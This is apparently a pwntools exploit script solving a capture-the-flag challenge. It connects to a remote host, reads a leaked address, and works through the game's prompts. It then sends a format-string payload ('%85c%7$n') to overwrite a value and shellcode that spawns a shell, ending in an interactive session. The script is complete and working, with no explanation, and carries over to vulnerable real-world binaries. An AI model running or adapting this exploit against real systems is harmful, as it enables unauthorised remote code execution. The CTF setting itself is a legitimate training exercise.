from pwn import *
context.arch = 'amd64'

# p = process('./pwn')
p = remote('111.198.29.45',53218)

print p.recvuntil('secret[0] is ')
a_0 = int(p.recvuntil('\n',drop=True),16)
log.info('a_0 = %#x',a_0)

p.sendlineafter("What should your character's name be:\n",'nop')
p.sendlineafter("So, where you will go?east or up?:","east")
p.sendlineafter("go into there(1), or leave(0)?:\n",'1')
p.sendlineafter("'Give me an address'\n",str(a_0))
p.sendlineafter("And, you wish is:\n",'%85c%7$n')
p.sendlineafter("Wizard: I will help you! USE YOU SPELL\n",asm(shellcraft.sh()))
sleep(1)
p.interactive()
